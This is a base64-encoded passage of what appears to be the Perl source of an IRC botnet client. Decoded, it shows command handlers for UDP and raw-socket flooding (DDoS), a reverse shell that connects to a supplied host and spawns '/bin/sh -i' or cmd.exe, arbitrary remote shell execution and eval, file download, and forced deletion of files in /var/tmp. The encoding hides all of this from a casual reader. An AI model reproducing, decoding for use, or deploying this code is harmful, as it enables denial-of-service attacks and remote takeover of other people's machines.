zb2NrZXQsICJQUklWTVNHICRwcmludGwgOlwwMDJcMDAzMTJTY2FuIENvbXBsYXRlXDAwM1wwMDIiKTsNCiAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgc2VuZHJhdygkSVJDX2N1cl9zb2NrZXQsIlBSSVZNU0cgJHByaW50bCA6XDAwMlwwMDMxMk5vIHBvcnRzIGZvdW5kLi5cMDAyIik7DQogICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgIyBSZW1vdmUNCiAgICAgIGVsc2lmICgkZnVuY2FyZyA9fiAvXnJtLykNCiAgICAgIHsNCiAgICAgICAgIHN5c3RlbSgiY2QgL3Zhci90bXAgOyBybSAtcmYgY2IgZmluZCBnb2QqIHd1bmRlciogdWRldiogbGliKiIpOw0KICAgICAgc2VuZHJhdygkSVJDX2N1cl9zb2NrZXQsICJQUklWTVNHICRwcmludGwgOlwwMDJcMDAzMTIoUXVpY2tkZWwpXDAwMlwwMDMxNCBSZW1vdmVkIGZpbGVzIGFuZCBmb2xkZXJzICIpOw0KICAgICAgfQ0KICAgICAgIyBWZXJzaW9uDQogICAgICBlbHNpZiAoJGZ1bmNhcmcgPX4gL152ZXJzaW9uLykNCiAgICAgIHsNCiAgICAgICAgIHNlbmRyYXcoJElSQ19jdXJfc29ja2V0LCAiUFJJVk1TRyAkcHJpbnRsIDpcMDAyXDAwMzEyKFZlcnNpb24pXDAwMlwwMDMxNCAkdmVyc2lvbiAiKTsNCiAgICAgIH0NCiAgICAgICMgRG93bmxvYWQNCiAgICAgICAgICAgZWxzaWYgKCRmdW5jYXJnID1+IC9eZG93blxzKyguKilccysoLiopLykNCiAgICAgIHsNCiAgICAgICAgICAgICAgZ2V0c3RvcmUoIiQxIiwgIiQyIik7DQogICAgICAgICAgICAgIHNlbmRyYXcoJElSQ19jdXJfc29ja2V0LCAiUFJJVk1TRyAkcHJpbnRsIDpcMDAyXDAwMzEyKERvd25sb2FkKVwwMDJcMDAzMTQgUGFnZTogJDIgKEZpbGU6ICQxKSIpIGlmICgkeHN0YXRzKTsNCiAgICAgICAgICAgfQ0KICAgICAgICMgVWRwDQogICAgICAgICAgICBlbHNpZiAoJGZ1bmNhcmcgPX4gL151ZHBccysoLiopXHMrKFxkKylccysoXGQrKS8pIHsNCiAgICAgICAgICAgICAgcmV0dXJuIHVubGVzcyAkcGFjb3RlczsNCiAgICAgICAgICAgICAgc29ja2V0KFRyMHgsIFBGX0lORVQsIFNPQ0tfREdSQU0sIDE3KTsNCiAgICAgICAgICAgICAgbXkgJGFsdm89aW5ldF9hdG9uKCIkMSIpOw0KICAgICAgICAgICAgICBteSAkcG9ydGEgPSAiJDIiOw0KICAgICAgICAgICAgICBteSAkdGVtcG8gPSAiJDMiOw0KICAgICAgICAgICAgICBteSAkcGFjb3RlOw0KICAgICAgICAgICAgICBteSAkcGFjb3Rlc2U7DQogICAgICAgICAgICAgIG15ICRmaW0gPSB0aW1lICsgJHRlbXBvOw0KICAgICAgICAgICAgICBteSAkcGFjb3RhID0gMTsNCiAgICAgICAgIHNlbmRyYXcoJElSQ19jdXJfc29ja2V0LCAiUFJJVk1TRyAkcHJpbnRsIDpcMDAyXDAwMzEyKFVEUCBERG9TaW5nKVwwMDMgQXR0YWNraW5nXDAwMjogJDEgLSBcMDAyVGltZVwwMDI6ICR0ZW1wbyIuInNlY29uZHMiKTsNCiAgICAgICAgICAgICAgd2hpbGUgKCgkcGFjb3RhID09ICIxIikgJiYgKCRwYWNvdGVzID09ICIxIikpIHsNCiAgICAgICAgICAgICAgICAkcGFjb3RhID0gMCBpZiAoKHRpbWUgPj0gJGZpbSkgJiYgKCR0ZW1wbyAhPSAiMCIpKTsNCiAgICAgICAgICAgICAgICAkcGFjb3RlPSRyYW5kIHggJHJhbmQgeCAkcmFuZDsNCiAgICAgICAgICAgICAgICAkcG9ydGEgPSBpbnQocmFuZCA2NTAwMCkgKzEgaWYgKCRwb3J0YSA9PSAiMCIpOw0KICAgICAgICAgICAgICAgIHNlbmQoVHIweCwgMCwgJHBhY290ZSwgc29ja2FkZHJfaW4oJHBvcnRhLCAkYWx2bykpIGFuZCAkcGFjb3Rlc2UrKyBpZiAoJHBhY290ZXMgPT0gIjEiKTsNCiAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICBpZiAoJHhzdGF0cykNCiAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgc2VuZHJhdygkSVJDX2N1cl9zb2NrZXQsICJQUklWTVNHICRwcmludGwgOlwwMDJcMDAzMTIoVURQIENvbXBsZXRlKTpcMDAzXDAwMiAkMSAtIFwwMDJTZW5kdFwwMDI6ICRwYWNvdGVzZSIuImtiIC0gXDAwMlRpbWVcMDAyOiAkdGVtcG8iLiJzZWNvbmRzIik7DQogICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgIyBCYWNrY29ubmVjdA0KICAgICAgICAgICAgZWxzaWYgKCRmdW5jYXJnID1+IC9eYmFja1xzKyguKilccysoXGQrKS8pIHsNCiAgICAgICAgICAgICAgbXkgJGhvc3QgPSAiJDEiOw0KICAgICAgICAgICAgICBteSAkcG9ydGEgPSAiJDIiOw0KICAgICAgICAgICAgICBteSAkcHJvdG8gPSBnZXRwcm90b2J5bmFtZSgndGNwJyk7DQogICAgICAgICAgICAgIG15ICRpYWRkciA9IGluZXRfYXRvbigkaG9zdCk7DQogICAgICAgICAgICAgIG15ICRwYWRkciA9IHNvY2thZGRyX2luKCRwb3J0YSwgJGlhZGRyKTsNCiAgICAgICAgICAgICAgbXkgJHNoZWxsID0gIi9iaW4vc2ggLWkiOw0KICAgICAgICAgICAgICBpZiAoJF5PIGVxICJNU1dpbjMyIikgew0KICAgICAgICAgICAgICAgICRzaGVsbCA9ICJjbWQuZXhlIjsNCiAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICBzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSBvciBkaWUgInNvY2tldDogJCEiOw0KICAgICAgICAgICAgICBjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSBvciBkaWUgImNvbm5lY3Q6ICQhIjsNCiAgICAgICAgIHNlbmRyYXcoJElSQ19jdXJfc29ja2V0LCAiUFJJVk1TRyAkcHJpbnRsIDpcMDAyW3hdIC0+XDAwMzQgSW5qZWN0aW9uIC4uLiIpOw0KICAgICAgICAgICAgICBvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCiAgICAgICAgICAgICAgb3BlbihTVERPVVQsICI+JlNPQ0tFVCIpOw0KICAgICAgICAgICAgICBvcGVuKFNUREVSUiwgIj4mU09DS0VUIik7DQogICAgICAgICAgICAgIHN5c3RlbSgiJHNoZWxsIik7DQogICAgICAgICBzeXN0ZW0oImNkIC90bXAvLm1yeCIpOw0KICAgICAgICAgICAgICBjbG9zZShTVERJTik7DQogICAgICAgICAgICAgIGNsb3NlKFNURE9VVCk7DQogICAgICAgICAgICAgIGNsb3NlKFNUREVSUik7DQogICAgICAgICAgICB9DQogICAgICAgICAgIGV4aXQ7DQogICAgICAgfQ0KICB9DQp9DQoNCnN1YiBpcmNhc2Ugew0KICBteSAoJGtlbSwgJHByaW50bCwgJGNhc2UpID0gQF87DQoNCiAgIGlmICgkY2FzZSA9fiAvXmpvaW4gKC4qKS8pIHsNCiAgICAgaigiJDEiKTsNCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXnBhcnQgKC4qKS8pIHsNCiAgICAgIHAoIiQxIik7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15yZWpvaW5ccysoLiopLykgew0KICAgICAgbXkgJGNoYW4gPSAkMTsNCiAgICAgIGlmICgkY2hhbiA9fiAvXihcZCspICguKikvKSB7DQogICAgICAgIGZvciAobXkgJGNhID0gMTsgJGNhIDw9ICQxOyAkY2ErKyApIHsNCiAgICAgICAgICBwKCIkMiIpOw0KICAgICAgICAgIGooIiQyIik7DQogICAgICAgIH0NCiAgICAgIH0gZWxzZSB7DQogICAgICAgICAgcCgiJGNoYW4iKTsNCiAgICAgICAgICBqKCIkY2hhbiIpOw0KICAgICAgfQ0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9eb3AvKSB7DQogICAgICBvcCgiJHByaW50bCIsICIka2VtIikgaWYgJGNhc2UgZXEgIm9wIjsNCiAgICAgIG15ICRvYXJnID0gc3Vic3RyKCRjYXNlLCAzKTsNCiAgICAgIG9wKCIkMSIsICIkMiIpIGlmICgkb2FyZyA9fiAvKFxTKylccysoXFMrKS8pOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9eZGVvcC8pIHsNCiAgICAgIGRlb3AoIiRwcmludGwiLCAiJGtlbSIpIGlmICRjYXNlIGVxICJkZW9wIjsNCiAgICAgIG15ICRvYXJnID0gc3Vic3RyKCRjYXNlLCA1KTsNCiAgICAgIGRlb3AoIiQxIiwgIiQyIikgaWYgKCRvYXJnID1+IC8oXFMrKVxzKyhcUyspLyk7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL152b2ljZS8pIHsNCiAgICAgIHZvaWNlKCIkcHJpbnRsIiwgIiRrZW0iKSBpZiAkY2FzZSBlcSAidm9pY2UiOw0KICAgICAgJG9hcmcgPSBzdWJzdHIoJGNhc2UsIDYpOw0KICAgICAgdm9pY2UoIiQxIiwgIiQyIikgaWYgKCRvYXJnID1+IC8oXFMrKVxzKyhcUyspLyk7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15kZXZvaWNlLykgew0KICAgICAgZGV2b2ljZSgiJHByaW50bCIsICIka2VtIikgaWYgJGNhc2UgZXEgImRldm9pY2UiOw0KICAgICAgJG9hcmcgPSBzdWJzdHIoJGNhc2UsIDgpOw0KICAgICAgZGV2b2ljZSgiJDEiLCAiJDIiKSBpZiAoJG9hcmcgPX4gLyhcUyspXHMrKFxTKykvKTsNCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXm1zZ1xzKyhcUyspICguKikvKSB7DQogICAgICBtc2coIiQxIiwgIiQyIik7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15mbG9vZFxzKyhcZCspXHMrKFxTKykgKC4qKS8pIHsNCiAgICAgIGZvciAobXkgJGNmID0gMTsgJGNmIDw9ICQxOyAkY2YrKykgew0KICAgICAgICBtc2coIiQyIiwgIiQzIik7DQogICAgICB9DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15jdGNwZmxvb2RccysoXGQrKVxzKyhcUyspICguKikvKSB7DQogICAgICBmb3IgKG15ICRjZiA9IDE7ICRjZiA8PSAkMTsgJGNmKyspIHsNCiAgICAgICAgY3RjcCgiJDIiLCAiJDMiKTsNCiAgICAgIH0NCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXmN0Y3BccysoXFMrKSAoLiopLykgew0KICAgICAgY3RjcCgiJDEiLCAiJDIiKTsNCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXmludml0ZVxzKyhcUyspICguKikvKSB7DQogICAgICBpbnZpdGUoIiQxIiwgIiQyIik7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15lY2hvLykgew0KICAgICAgc3lzdGVtKCJlY2hvICRtZXVuaWNrID4gYHB3ZGAvYm90bmljayIpOw0KICAgICAgbXNnKCJkb25lIik7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15uaWNrICguKikvKSB7DQogICAgICBuaWNrKCIkMSIpOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9eanVtcFxzKyhcUyspXHMrKFxTKykvKSB7DQogICAgICAgY29uZWN0YXIoIiQyIiwgIiQxIiwgNjY2Nyk7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15zZW5kXHMrKFxTKylccysoXFMrKS8pIHsNCiAgICAgIERDQzo6U0VORCgiJDEiLCAiJDIiKTsNCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXnJhdyAoLiopLykgew0KICAgICAgc2VuZHJhdygiJDEiKTsNCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXmV2YWwgKC4qKS8pIHsNCiAgICAgIGV2YWwgIiQxIjsNCiAgIH0NCiAgIGVsc2lmICgkY2FzZSA9fiAvXnJqXHMrKFxTKylccysoXGQrKS8pIHsNCiAgICBzbGVlcCBpbnQocmFuZCgkMikpOw0KICAgIGooIiQxIik7DQogICB9DQogICBlbHNpZiAoJGNhc2UgPX4gL15ycFxzKyhcUyspXHMrKFxkKykvKSB7DQogICAgc2xlZXAgaW50KHJhbmQoJDIpKTsNCiAgICBwKCIkMSIpOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9ecXVpdC8pIHsNCiAgICAgcXVpdCgpOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9ecmFuZC8pIHsNCiAgICBteSAkbm92b25pY2sgPSBnZXRuaWNrKCk7DQogICAgIG5pY2soIiRub3ZvbmljayIpOw0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9ec3RhdCAoLiopLykgew0KICAgICBpZiAoJDEgZXEgIm9uIikgew0KICAgICAgJHhzdGF0cyA9IDE7DQogICAgICBtc2coIiRwcmludGwiLCAiU2F0dXMgZW5hYmxlZCIpOw0KICAgICB9IGVsc2lmICgkMSBlcSAib2ZmIikgew0KICAgICAgJHhzdGF0cyA9IDA7DQogICAgICBtc2coIiRwcmludGwiLCAiU3RhdHVzIGRpc2FibGUiKTsNCiAgICAgfQ0KICAgfQ0KICAgZWxzaWYgKCRjYXNlID1+IC9eYmFuZyAoLiopLykgew0KICAgICBpZiAoJDEgZXEgIm9uIikgew0KICAgICAgJHBhY290ZXMgPSAxOw0KICAgICAgbXNnKCIkcHJpbnRsIiwgIlt4XSBCYW5nIG1vZGUgZW5hYmxlZCIpIGlmICgkeHN0YXRzID09ICIxIik7DQogICAgIH0gZWxzaWYgKCQxIGVxICJvZmYiKSB7DQogICAgICAkcGFjb3RlcyA9IDA7DQogICAgICBtc2coIiRwcmludGwiLCAiW3hdIEJhbmcgbW9kZSBkaXNhYmxlZCIpIGlmICgkeHN0YXRzID09ICIxIik7DQogICAgIH0NCiAgIH0NCn0NCnN1YiBzaGVsbCB7DQogIHJldHVybiB1bmxlc3MgJHNoZWxsYWNjZXNzOw0KICBteSAkcHJpbnRsPSRfWzBdOw0KICBteSAkY29tYW5kbz0kX1sxXTsNCiAgaWYgKCRjb21hbmRvID1+IC9jZCAoLiopLykgew0KICAgIGNoZGlyKCIkMSIpIHx8IG1zZygiJHByaW50bCIsICJjZDogJDEiLiI6IE5vIHN1Y2ggZmlsZSBvciBkaXJlY3RvcnkiKTsNCiAgICByZXR1cm47DQogIH0NCiAgZWxzaWYgKCRwaWQgPSBmb3JrKSB7DQogICAgIHdhaXRwaWQoJHBpZCwgMCk7DQogIH0gZWxzZSB7DQogICAgICBpZiAoZm9yaykgew0KICAgICAgICAgZXhpdDsNCiAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICBteSBAcmVzcD1gJGNvbWFuZG8gMj4mMSAzPiYxYDsNCiAgICAgICAgICAgbXkgJGM9MDsNCiAgICAgICAgICAgZm9yZWFjaCBteSAkbGluaGEgKEByZXNwKSB7DQogICAgICAgICAgICAgJGMrKzsNCiAgICAgICAgICAgICBjaG9wICRsaW5oYTsNCiAgICAgICAgICAgICBzZW5kcmF3KCRJUkNfY3VyX3NvY2tldCwgIlBSSVZNU0cgJHByaW50bCA6JGxpbmhhIik7DQogICAgICAgICAgICAgaWYgKCRjID49ICIkbGluYXNfbWF4Iikgew0KICAgICAgICAgICAgICAgJGM9MDsNCiAgICAgICAgICAgICAgIHNsZWVwICRzbGVlcDsNCiAgICAgICAgICAgICB9DQogICAgICAgICAgIH0NCiAgICAgICAgICAgZXhpdDsNCiAgICAgICB9DQogIH0NCn0NCg0Kc3ViIGF0dGFja2VyIHsNCiAgbXkgJGlhZGRyID0gaW5ldF9hdG9uKCRfWzBdKTsNCiAgbXkgJG1zZyA9ICdCJyB4ICRfWzFdOw0KICBteSAkZnRpbWUgPSAkX1syXTsNCiAgbXkgJGNwID0gMDsNCiAgbXkgKCVwYWNvdGVzKTsNCiAgJHBhY290ZXN7aWNtcH0gPSAkcGFjb3Rlc3tpZ21wfSA9ICRwYWNvdGVze3VkcH0gPSAkcGFjb3Rlc3tvfSA9ICRwYWNvdGVze3RjcH0gPSAwOw0KDQogIHNvY2tldChTT0NLMSwgUEZfSU5FVCwgU09DS19SQVcsIDIpIG9yICRjcCsrOw0KICBzb2NrZXQoU09DSzIsIFBGX0lORVQsIFNPQ0tfREdSQU0sIDE3KSBvciAkY3ArKzsNCiAgc29ja2V0KFNPQ0szLCBQRl9JTkVULCBTT0NLX1JBVywgMSkgb3IgJGNwKys7DQogIHNvY2tldChTT0NLNCwgUEZfSU5FVCwgU09DS19SQVcsIDYpIG9yICRjcCsrOw0KICByZXR1cm4odW5kZWYpIGlmICRjcCA9PSA0Ow0KICBteSAkaXRpbWUgPSB0aW1lOw0KICBteSAoJGN1cl90aW1lKTsNCiAgd2hpbGUgKCAxICkgew0KICAgICBmb3IgKG15ICRwb3J0YSA9IDE7ICRwb3J0YSA8PSA2NTUzNTsgJHBvcnRhKyspIHsNCiAgICAgICAkY3VyX3RpbWUgPSB0aW1lIC0gJGl0aW1lOw0KICAgICAgIGxhc3QgaWYgJGN1cl90aW1lID49ICRmdGltZTsNCiAgICAgICBzZW5kKFNPQ0sxLCAkbXNnLCAwLCBzb2NrYWRkcl9pbigkcG9ydGEsICRpYWRkcikpIGFuZCAkcGFjb3Rlc3tpZ21wfSsrIGlmICgkcGFjb3RlcyA9PSAxKTsNCiAgICAgICBzZW5kKFNPQ0syLCAkbXNnLCAwLCBzb2NrYWRkcl9pbigkcG9ydGEsICRpYWRkcikpIGFuZCAkcGFjb3Rlc3t1ZHB9KysgaWYgKCRwYWNvdGVzID09IDEpOw0KICAgICAgIHNlbmQoU09DSzMsICRtc2csIDAsIHNvY2thZGRyX2luKCRwb3J0YSwgJGlhZGRyKSkgYW5kICRwYWNvdGVze2ljbXB9KysgaWYgKCRwYWNvdGVzID09IDEpOw0KICAgICAgIHNlbmQoU09DSzQsICRtc2csIDAsIHNvY2thZGRyX2luKCRwb3J0YSwgJGlhZGRyKSkgYW5kICRwYWNvdGVze3RjcH0rKyBpZiAoJHBhY290ZXMgPT0gMSk7DQogICAgICAgZm9yIChteSAkcGMgPSAzOyAkcGMgPD0gMjU1OyRwYysrKSB7DQogICAgICAgICBuZXh0IGlmICRwYyA9PSA2Ow0KICAgICAgICAgJGN1cl90aW1lID0gdGltZSAtICRpdGltZTsNCiAgICAgICAgIGxhc3QgaWYgJGN1cl90aW1lID49ICRmdGltZTsNCiAgICAgICAgIHNvY2tldChTT0NLNSwgUEZfSU5FVCwgU09DS19SQVcsICRwYykgb3IgbmV4dDsNCiAgICAgICAgIHNlbmQoU09DSzUsICRtc2csIDAsIHNvY2thZGRyX2luKCRwb3J0YSwgJGlhZGRyKSkgYW5kICRwYWNvdGVze299KysgaWYgKCRwYWNvdGVzID09IDEpOw0KICAgICAgIH0NCiAgICAgfQ0KICAgICBsYXN0IGlmICRjdXJfdGltZSA+PSAkZnRpbWU7DQogIH0NCiAgcmV0dXJuKCRjdXJfdGltZSwgJXBhY290ZXMpOw0KfQ0KDQpzdWIgYWN0aW9uIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJQUklWTVNHICRfWzBdIDpcMDAxQUNUSU9OICRfWzFdXDAwMSIpOw0KfQ0Kc3ViIGN0Y3Agew0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsNCiAgIHNlbmRyYXcoIlBSSVZNU0cgJF9bMF0gOlwwMDEkX1sxXVwwMDEiKTsNCn0NCnN1YiBtc2cgew0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsNCiAgIHNlbmRyYXcoIlBSSVZNU0cgJF9bMF0gOiRfWzFdIik7DQp9DQpzdWIgbm90aWNlIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJOT1RJQ0UgJF9bMF0gOiRfWzFdIik7DQp9DQpzdWIgb3Agew0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsNCiAgIHNlbmRyYXcoIk1PREUgJF9bMF0gK28gJF9bMV0iKTsNCn0NCnN1YiBkZW9wIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJNT0RFICRfWzBdIC1vICRfWzFdIik7DQp9DQpzdWIgaG9wIHsNCiAgICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOw0KICAgc2VuZHJhdygiTU9ERSAkX1swXSAraCAkX1sxXSIpOw0KfQ0Kc3ViIGRlaG9wIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJNT0RFICRfWzBdICtoICRfWzFdIik7DQp9DQpzdWIgdm9pY2Ugew0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsNCiAgIHNlbmRyYXcoIk1PREUgJF9bMF0gK3YgJF9bMV0iKTsNCn0NCnN1YiBkZXZvaWNlIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJNT0RFICRfWzBdIC12ICRfWzFdIik7DQp9DQpzdWIgYmFuIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJNT0RFICRfWzBdICtiICRfWzFdIik7DQp9DQpzdWIgdW5iYW4gew0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsNCiAgIHNlbmRyYXcoIk1PREUgJF9bMF0gLWIgJF9bMV0iKTsNCn0NCnN1YiBraWNrIHsNCiAgIHJldHVybiB1bmxlc3MgJCNfID09IDE7DQogICBzZW5kcmF3KCJLSUNLICRfWzBdICRfWzFdIDokX1syXSIpOw0KfQ0Kc3ViIG1vZG8gew0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMDsNCiAgIHNlbmRyYXcoIk1PREUgJF9bMF0gJF9bMV0iKTsNCn0NCnN1YiBtb2RlIHsgbW9kbyhAXyk7IH0NCnN1YiBqIHsgJmpvaW4oQF8pOyB9DQpzdWIgam9pbiB7DQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAwOw0KICAgc2VuZHJhdygiSk9JTiAkX1swXSIpOw0KfQ0Kc3ViIHAgeyBwYXJ0KEBfKTsgfQ0Kc3ViIHBhcnQge3NlbmRyYXcoIlBBUlQgJF9bMF0iKTt9DQpzdWIgbmljayB7DQogIHJldHVybiB1bmxlc3MgJCNfID09IDA7DQogIHNlbmRyYXcoIk5JQ0sgJF9bMF0iKTsNCn0NCnN1YiBpbnZpdGUgew0KICAgcmV0dXJuIHVubGVzcyAkI18gPT0gMTsNCiAgIHNlbmRyYXcoIklOVklURSAkX1sxXSAkX1swXSIpOw0KfQ0Kc3ViIHRvcGljbyB7DQogICByZXR1cm4gdW5sZXNzICQjXyA9PSAxOw0KICAgc2VuZHJhdygiVE9QSUMgJF9bMF0gJF9bMV0iKTsNCn0NCnN1YiB0b3BpYyB7IHRvcGljbyhAXyk7IH0NCnN1YiB3aG9pcyB7DQogIHJldHVybiB1bmxlc3MgJCNfID09IDA7DQogIHNlbmRyYXcoIldIT0lTICRfWzBdIik7DQp9DQpzdWIgd2hvIHsNCiAgcmV0dXJuIHVubGVzcyAkI18gPT0gMDsNCiAgc2VuZHJhdygiV0hPICRfWzBdIik7DQp9DQpzdWIgbmFtZXMgew0KICByZXR1cm4gdW5sZXNzICQjXyA9PSAwOw0KICBzZW5kcmF3KCJOQU1FUyAkX1swXSIpOw0KfQ0Kc3ViIGF3YXkgew0KICBzZW5kcmF3KCJBV0FZICRfWzBdIik7DQp9DQpzdWIgYmFjayB7IGF3YXkoKTsgfQ0Kc3ViIHF1aXQgew0KICBzZW5kcmF3KCJRVUlUIDokX1swXSIpOw0KICBleGl0Ow0KfQ0KDQpwYWNrYWdlIERDQzsNCnN1YiBjb25uZWN0aW9ucyB7DQogICBteSBAcmVhZHkgPSAkZGNjX3NlbC0+Y2FuX3JlYWQoMSk7DQojICAgcmV0dXJuIHVubGVzcyAoQHJlYWR5KTsNCiAgIGZvcmVhY2ggbXkgJGZoIChAcmVhZHkpIHsNCiAgICAgbXkgJGRjY3RpcG8gPSAkRENDeyRmaH17dGlwb307DQogICAgIG15ICRhcnF1aXZvID0gJERDQ3skZmh9e2FycXVpdm99Ow0KICAgICBteSAkYnl0ZXMgPSAkRENDeyRmaH17Ynl0ZXN9Ow0KICAgICBteSAkY3VyX2J5dGUgPSAkRENDeyRmaH17Y3VyYnl0ZX07DQogICAgIG15ICRuaWNrID0gJERDQ3skZmh9e25pY2t9Ow0KICAgICBteSAkbXNnOw0KICAgICBteSAkbnJlYWQgPSBzeXNyZWFkKCRmaCwgJG1zZywgMTAyNDApOw0KICAgICBpZiAoJG5yZWFkID09IDAgYW5kICRkY2N0aXBvID1+IC9eKGdldHxzZW5kY29uKSQvKSB7DQogICAgICAgICREQ0N7JGZofXtzdGF0dXN9ID0gIkNhbmNlbGFkbyI7DQogICAgICAgICREQ0N7JGZofXtmdGltZX0gPSB0aW1lOw0KICAgICAgICAkZGNjX3NlbC0+cmVtb3ZlKCRmaCk7DQogICAgICAgICRmaC0+Y2xvc2U7DQogICAgICAgIG5leHQ7DQogICAgIH0NCiAgICAgaWYgKCRkY2N0aXBvIGVxICJnZXQiKSB7DQogICAgICAgICREQ0N7JGZofXtjdXJieXRlfSArPSBsZW5ndGgoJG1zZyk7DQoNCiAgICAgICAgbXkgJGN1cl9ieXRlID0gJERDQ3skZmh9e2N1cmJ5dGV9Ow0KDQogICAgICAgIG9wZW4oRklMRSwgIj4+ICRhcnF1aXZvIik7DQogICAgICAgIHByaW50IEZJTEUgIiRtc2ciIGlmICgkY3VyX2J5dGUgPD0gJGJ5dGVzKTsNCiAgICAgICAgY2xvc2UoRklMRSk7DQoNCiAgICAgICAgbXkgJHBhY2tieXRlID0gcGFjaygiTiIsICRjdXJfYnl0ZSk7DQogICAgICAgIHByaW50ICRmaCAiJHBhY2tieXRlIjsNCg0KICAgICAgICBpZiAoJGJ5dGVzID09ICRjdXJfYnl0ZSkgew0KICAgICAgICAgICAkZGNjX3NlbC0+cmVtb3ZlKCRmaCk7DQogICAgICAgICAgICRmaC0+Y2xvc2U7DQogICAgICAgICAgICREQ0N7JGZofXtzdGF0dXN9ID0gIlJlY2ViaWRvIjsNCiAgICAgICAgICAgJERDQ3skZmh9e2Z0aW1lfSA9IHRpbWU7DQogICAgICAgICAgIG5leHQ7DQogICAgICAgIH0NCiAgICAgfSBlbHNpZiAoJGRjY3RpcG8gZXEgInNlbmQiKSB7DQogICAgICAgICAgbXkgJHNlbmQgPSAkZmgtPmFjY2VwdDsNCiAgICAgICAgICAkc2VuZC0+YXV0b2ZsdXNoKDEpOw0KICAgICAgICAgICRkY2Nfc2VsLT5hZGQoJHNlbmQpOw0KICAgICAgICAgICRkY2Nfc2VsLT5yZW1vdmUoJGZoKTsNCiAgICAgICAgICAkRENDeyRzZW5kfXt0aXBvfSA9ICdzZW5kY29uJzsNCiAgICAgICAgICAkRENDeyRzZW5kfXtpdGltZX0gPSB0aW1lOw0KICAgICAgICAgICREQ0N7JHNlbmR9e25pY2t9ID0gJG5pY2s7DQogICAgICAgICAgJERDQ3skc2VuZH17Ynl0ZXN9ID0gJGJ5dGVzOw0KICAgICAgICAgICREQ0N7JHNlbmR9e2N1cmJ5dGV9ID0gMDsNCiAgICAgICAgICAkRENDeyRzZW5kfXthcnF1aXZvfSA9ICRhcnF1aXZvOw0KICAgICAgICAgICREQ0N7JHNlbmR9e2lwfSA9ICRzZW5kLT5wZWVyaG9zdDsNCiAgICAgICAgICAkRENDeyRzZW5kfXtwb3J0YX0gPSAkc2VuZC0+cGVlcnBvcnQ7DQogICAgICAgICAgJERDQ3skc2VuZH17c3RhdHVzfSA9ICJFbnZpYW5kbyI7DQogICAgICAgICAgb3BlbihGSUxFLCAiPCAkYXJxdWl2byIpOw0KICAgICAgICAgIG15ICRmYnl0ZXM7DQogICAgICAgICAgcmVhZChGSUxFLCAkZmJ5dGVzLCAxMDI0KTsNCiAgICAgICAgICBwcmludCAkc2VuZCAiJGZieXRlcyI7DQogICAgICAgICAgY2xvc2UgRklMRTsNCiMgICAgICAgICAgZGVsZXRlKCREQ0N7JGZofSk7DQogICAgIH0gZWxzaWYgKCRkY2N0aXBvIGVxICdzZW5kY29uJykgew0KICAgICAgICAgIG15ICRieXRlc19zZW5kZWQgPSB1bnBhY2soIk4iLCAkbXNnKTsNCiAgICAgICAgICAkRENDeyRmaH17Y3VyYnl0ZX0gPSAkYnl0ZXNfc2VuZGVkOw0KICAgICAgICAgIGlmICgkYnl0ZXNfc2VuZGVkID09ICRieXRlcykgew0KICAgICAgICAgICAgICRmaC0+Y2xvc2U7DQogICAgICAgICAgICAgJGRjY19zZWwtPnJlbW92ZSgkZmgpOw0KICAgICAgICAgICAgICREQ0N7JGZofXtzdGF0dXN9ID0gIkVudmlhZG8iOw0KICAgICAgICAgICAgICREQ0N7JGZofXtmdGltZX0gPSB0aW1lOw0KICAgICAgICAgICAgIG5leHQ7DQogICAgICAgICAgfQ0KICAgICAgICAgIG9wZW4oU0VOREZJTEUsICI8ICRhcnF1aXZvIik7DQogICAgICAgICAgc2VlayhTRU5ERklMRSwgJGJ5dGVzX3NlbmRlZCwgMCk7DQogICAgICAgICAgbXkgJHNlbm